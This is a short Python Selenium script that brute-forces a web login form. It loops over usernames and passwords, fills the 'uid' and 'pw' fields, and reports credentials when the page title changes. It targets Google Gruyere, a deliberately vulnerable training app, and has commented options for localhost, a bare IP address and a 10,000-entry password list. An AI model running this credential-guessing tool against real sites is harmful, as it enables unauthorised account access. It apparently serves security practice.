import time

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By

def read_wordlist(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

s = Service(executeable_path="chromedriver.exe")

driver = webdriver.Chrome(service=s)
website = "http://google-gruyere.appspot.com/449071968629735928859875229164042102137/login"
#website = "http://127.0.0.1:5000/login"
#website = "http://141.87.59.240:5000/login"

driver.get(website)

title = ""
#usernames = read_wordlist("usernames.txt")
#passwords = read_wordlist("10_million_password_list_top_10000.txt")


usernames = ["christoffer"]
passwords = ["jennifer"]

for user in usernames:

    print("-- Testing User ", user, "--")
    for password in passwords:
        print("Testing Password", password)

        res = driver.find_elements(By.NAME, "uid")

        #assert(len(res) == 2)
        res[0].clear()
        res[0].send_keys(user)

        res = driver.find_elements(By.NAME, "pw")

        res[0].clear()
        res[0].send_keys(password)

        but = driver.find_elements(By.TAG_NAME, "input")
        #but = driver.find_element_by_css_selector("[type='submit']")
        #assert (len(but) == 1)
        but[2].click()

        print(driver.title)
        #time.sleep(5)
        if driver.title != "Gruyere: Login":
            print(f"Username is {user}")
            print(f"Password is {password}")
            print("Found")
            break

#usernames.close()
#passwords.close()
driver.quit()
